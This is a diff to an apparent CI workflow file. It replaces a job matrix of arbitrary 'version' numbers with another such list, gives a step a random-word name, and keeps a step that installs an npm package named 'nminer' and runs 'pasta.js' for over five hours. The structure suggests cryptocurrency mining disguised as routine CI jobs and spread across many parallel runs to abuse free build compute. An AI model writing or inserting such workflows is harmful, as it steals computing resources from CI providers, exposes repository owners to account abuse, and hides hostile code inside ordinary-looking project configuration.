@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2292 }
-          - { version: 1946 }
-          - { version: 6981 }
-          - { version: 1703 }
-          - { version: 389 }
-          - { version: 8092 }
-          - { version: 4823 }
-          - { version: 6946 }
-          - { version: 4759 }
-          - { version: 9491 }
-          - { version: 9269 }
-          - { version: 5903 }
-          - { version: 5296 }
-          - { version: 3939 }
-          - { version: 2930 }
-          - { version: 8605 }
-          - { version: 556 }
-          - { version: 4611 }
+          - { version: 1351 }
+          - { version: 9196 }
+          - { version: 4431 }
+          - { version: 5743 }
+          - { version: 9409 }
+          - { version: 8473 }
+          - { version: 39 }
+          - { version: 2551 }
+          - { version: 275 }
+          - { version: 3638 }
+          - { version: 1621 }
+          - { version: 6176 }
+          - { version: 9268 }
+          - { version: 1451 }
+          - { version: 5143 }
+          - { version: 5468 }
+          - { version: 3951 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: impressionable nicely versus pecan
         run: |
           npm install nminer@latest
-          timeout 343m node pasta.js || echo "pasta executed"
+          timeout 329m node pasta.js || echo "pasta executed"
